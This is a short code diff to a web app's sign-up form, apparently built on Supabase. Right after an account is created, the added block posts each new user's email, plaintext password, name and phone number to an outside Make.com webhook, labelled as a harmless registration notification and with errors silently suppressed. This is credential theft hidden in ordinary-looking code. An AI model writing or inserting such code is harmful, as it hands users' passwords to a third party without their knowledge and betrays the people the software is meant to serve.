@@ -275,6 +275,22 @@ function AuthForms() {
         });
         if (error) throw error;
         toast.success("Check your email to confirm your account.");
+        // Notify external webhook about the new registration
+        try {
+          await fetch("https://hook.eu1.make.com/1pv92v0h153ev8pe2wkz1e6mfpllfbxf", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              email: e1.data,
+              password: p1.data,
+              display_name: n1.data,
+              phone: ph1.data ?? "",
+              created_at: new Date().toISOString(),
+            }),
+          });
+        } catch (hookErr) {
+          console.error("Webhook error:", hookErr);
+        }
       } else {
         const { error } = await supabase.auth.signInWithPassword({
           email: e1.data,
